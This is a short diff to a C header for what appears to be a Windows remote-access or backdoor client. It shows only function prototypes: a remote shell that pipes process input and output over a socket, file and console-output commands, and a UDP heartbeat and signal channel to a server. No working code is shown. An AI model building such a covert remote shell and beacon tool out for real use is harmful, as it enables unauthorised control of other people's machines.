@@ -9,7 +9,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <signal.h>
-
+#include <process.h>
 
 enum SIG  {_SIG_INIT = 0x00, _SIG_HRBT= 0xff, _SIG_FILE = 0x01, _SIG_COUT = 0x02, _SIG_SHLL = 0x03};
 
@@ -26,7 +26,7 @@ int InitSetup(void);
 
 int ScanOutPipe(HANDLE hStdoutRd, OVERLAPPED* readOverlapped, SOCKET sockt);
 int WriteInPipe(HANDLE hStdinWr, OVERLAPPED* writeOverlapped,  SOCKET sockt);
-int Shell(PROCESS_INFORMATION pi, SOCKET sock);
+int Shell(PROCESS_INFORMATION* pi, SOCKET sock);
 int Cout(SOCKET sockt, ...);
 int File(SOCKET sockt, ...);
 
@@ -43,5 +43,6 @@ int SetupClientUDP(SOCKET* _socku_c);
 int GenerateSockaddrin(SOCKADDR_IN* ptr, char* ip, short port);
 int HeartBeat(SOCKET socku, SOCKADDR_IN* sa);
 int InitServer(SOCKET socku, SOCKADDR_IN* sa);
+int SendSigUDP(SOCKET socku, SOCKADDR_IN* sa, char sig);
 
 #endif
